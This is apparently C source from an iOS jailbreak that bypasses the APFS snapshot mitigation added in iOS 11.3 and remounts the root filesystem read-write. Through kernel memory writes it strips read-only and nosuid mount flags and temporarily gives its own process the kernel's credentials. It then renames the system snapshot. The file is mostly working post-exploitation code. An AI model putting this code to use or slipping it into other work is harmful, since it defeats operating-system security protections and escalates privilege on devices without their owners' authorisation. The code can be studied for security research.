// Thanks to the Electra Team and Pwn20wnd!
/* APFS snapshot mitigation bypass bug by CoolStar, exploitation by Pwn20wnd */
/* Disables the new APFS snapshot mitigations introduced in iOS 11.3 */

#include <stdio.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <CoreFoundation/CoreFoundation.h>
#include "rootfs_remount.h"
#include "snapshot_tools.h"
#include "../sock_port/kernel_memory.h"
#include "../Kernel Utilities/kernel_utils.h"
#include "../PatchFinder/patchfinder64.h"
#include "../Kernel Utilities/kexecute.h"
#include "../sock_port/offsetof.h"
#include "../Kernel Utilities/system_reboot.h"

#define ROOTFSTESTFILE "/.BlizzardJB"
#define ROOTFSMNT "/var/rootfsmnt"

uint64_t offset_vfs_context_current;
uint64_t offset_vnode_lookup;
uint64_t offset_vnode_put;
char *diskLocation = "/dev/disk0s1s1";

void dumpContentsOfDir(char *path);

// From http://newosxbook.com/src.jl?tree=&file=/xnu-1504.15.3/bsd/hfs/hfs_mount.h
struct hfs_mount_args {
    char       *fspec;                                       /* block special device to mount */
    uid_t      hfs_uid;                                      /* uid that owns hfs files (standard HFS only) */
    gid_t      hfs_gid;                                      /* gid that owns hfs files (standard HFS only) */
    mode_t     hfs_mask;                                     /* mask to be applied for hfs perms  (standard HFS only) */
    u_int32_t  hfs_encoding;                                 /* encoding for this volume (standard HFS only) */
    struct     timezone hfs_timezone;                        /* user time zone info (standard HFS only) */
    int        flags;                                        /* mounting flags, see below */
    int        journal_tbuffer_size;                         /* size in bytes of the journal transaction buffer */
    int        journal_flags;                                /* flags to pass to journal_open/create */
    int        journal_disable;                              /* don't use journaling (potentially dangerous) */
};

int file_exists(const char *filename) {
    int r = access(filename, F_OK);
    return (r == 0);
}

// From Electra's open-source.
uint64_t get_vfs_context() {
    uint64_t vfs_context = kexecute(offset_vfs_context_current, 1, 0, 0, 0, 0, 0, 0);
    vfs_context = ZmFixAddr(vfs_context);
    return vfs_context;
}

// From Electra's open-source.
int vnode_lookup(const char *path, int flags, uint64_t *vpp, uint64_t vfs_context){
    size_t len = strlen(path) + 1;
    uint64_t vnode = kalloc(sizeof(uint64_t));
    uint64_t ks = kalloc(len);
    kwrite(ks, path, len);
    int ret = (int)kexecute(offset_vnode_lookup, ks, 0, vnode, vfs_context, 0, 0, 0);
    if (ret != 0) {
        return -1;
    }
    *vpp = rk64(vnode);
    kfree(ks, len);
    kfree(vnode, sizeof(uint64_t));
    return 0;
}

int vnode_put(uint64_t vnode){
    return (int)kexecute(offset_vnode_put, vnode, 0, 0, 0, 0, 0, 0);
}

uint64_t getVnodeAtPath(uint64_t vfs_context, char *path){
    uint64_t *vpp = (uint64_t *)malloc(sizeof(uint64_t));
    int ret = vnode_lookup(path, O_RDONLY, vpp, vfs_context);
    if (ret != 0){
        printf("ROOTFS Remount: Unable to get vnode from path for %s\n", path);
        return -1;
    }
    uint64_t vnode = *vpp;
    free(vpp);
    return vnode;
}

int mountReadWriteDevice(char *dev, char *path) {
    struct hfs_mount_args mntargs;
    bzero(&mntargs, sizeof(struct hfs_mount_args));
    mntargs.fspec = dev;
    mntargs.hfs_mask = 1;
    gettimeofday(NULL, &mntargs.hfs_timezone);
    int rvtmp = mount("apfs", path, 0, (void *)&mntargs);
    printf("ROOTFS Remount: mounting: %d\n", rvtmp);
    return rvtmp;
}

int legacy_RemountFS(uint64_t slide, uint64_t kern_proc, uint64_t our_proc){
    uint64_t _rootvnode = find_rootvnode();
    uint64_t rootfs_vnode = rk64(_rootvnode);
    uint64_t v_mount = rk64(rootfs_vnode + off_v_mount);
    uint32_t v_flag = rk32(v_mount + off_mnt_flag);
    v_flag = v_flag & ~MNT_NOSUID;
    v_flag = v_flag & ~MNT_RDONLY;
    wk32(v_mount + off_mnt_flag, v_flag & ~MNT_ROOTFS);
    char *dev_path = strdup("/dev/disk0s1s1");
    int rv = mount("apfs", "/", MNT_UPDATE, (void *)&dev_path);
    printf("ROOTFS Remount: remount2: %d\n", rv);
    v_mount = rk64(rootfs_vnode + off_v_mount);
    wk32(v_mount + off_mnt_flag, v_flag);

    if (file_exists(ROOTFSTESTFILE)){
        printf("ROOTFS Remount: Unlinking...\n");
        unlink(ROOTFSTESTFILE);
    }
    
    int fd = open(ROOTFSTESTFILE, O_RDONLY);
    if (fd == -1) {
        fd = creat(ROOTFSTESTFILE, 0644);
    } else {
        printf("ROOTFS Remount: File already exists!\n");
    }
    close(fd);
    printf("ROOTFS Remount: Checking R/W Status %s\n", file_exists(ROOTFSTESTFILE) ? "GOT R/W!" : "NOT R/W");
    return 0;
}

// From Jake James
int systemRemountFS(uint64_t slide, uint64_t kern_proc, uint64_t selfProcess, int already_snappshoted){
    if (kCFCoreFoundationVersionNumber <= 1451.51 || already_snappshoted == 0){
        return legacy_RemountFS(slide, kern_proc, selfProcess);
    }
    
    if (!getOffsets(slide)){
        return -1;
    }
    
    uint64_t kernelCredentials = rk64(kern_proc+off_p_ucred);
    uint64_t selfProcessCredentials = rk64(selfProcess+off_p_ucred);
    uint64_t vfs_context = get_vfs_context();
    uint64_t devVnode = getVnodeAtPath(vfs_context, diskLocation);
    uint64_t specInfo = rk64(devVnode + off_v_specinfo);
    wk32(specInfo + off_si_flags, 0);
    if (file_exists(ROOTFSMNT))
        rmdir(ROOTFSMNT);
    
    mkdir(ROOTFSMNT, 0755);
    chown(ROOTFSMNT, 0, 0);
    
    printf("ROOTFS Remount: Getting Kernel Credentials...\n");
    wk64(selfProcess + off_p_ucred, kernelCredentials);
    int returnValue = -1;
    
    if (mountReadWriteDevice(diskLocation, ROOTFSMNT) != ERR_SUCCESS) {
        printf("ROOTFS Remount: Error mounting root at %s\n", ROOTFSMNT);
        goto out;
    }
    
    printf("ROOTFS Remount: Bypassing APFS Snapshots...\n");
    const char *systemSnapshot = find_system_snapshot(ROOTFSMNT);
    const char *newsnapName = "orig-fs";
    if (!systemSnapshot) {
        goto out;
    }
    int retValueForRename = snapRenameAtPath(ROOTFSMNT, systemSnapshot, newsnapName);
    
    if (retValueForRename) {
        goto out;
    }
    returnValue = 0;
    unmount(ROOTFSMNT, 0);
    rmdir(ROOTFSMNT);
    
out:
    printf("ROOTFS Remount: Restoring original process credentials...\n");
    wk64(selfProcess+off_p_ucred, selfProcessCredentials);
    vnode_put(devVnode);
    
    if (!returnValue) {
        printf("ROOTFS Remount: Successfully bypassed APFS Snapshots.\n");
        printf("ROOTFS Remount: Restarting\n");
        
        
    } else {
        printf("ROOTFS Remount: Failed to bypass APFS Snapshots.\n");
    }
    
    return -1;
}
